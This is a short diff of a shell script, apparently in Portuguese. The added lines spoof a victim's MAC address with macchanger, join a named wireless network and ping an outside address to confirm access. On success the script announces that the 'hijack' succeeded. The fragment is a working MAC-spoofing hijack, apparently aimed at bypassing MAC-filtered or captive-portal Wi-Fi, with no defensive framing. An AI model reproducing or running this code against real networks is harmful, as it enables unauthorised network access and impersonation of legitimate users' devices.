@@ -24,8 +24,19 @@ else
 		then
 			let cont=cont+1
 		else
-			echo $ip_target " - " $mac_target >> bola.txt
-			let cont=cont+1
+			ifconfig $1 down
+			macchanger $1 --mac $mac_target
+			ifconfig $1 up
+			iwconfig $1 essid $2
+			
+			ping -c1 -w1 8.8.8.8 >/dev/null
+     			if [ $? -eq 0 ] 
+			then
+       				echo "\n [+] Hijack efetuado com sucesso!\n"
+				cont=255
+			else
+				let cont=cont+1
+     			fi
 		fi
 		
 	done;
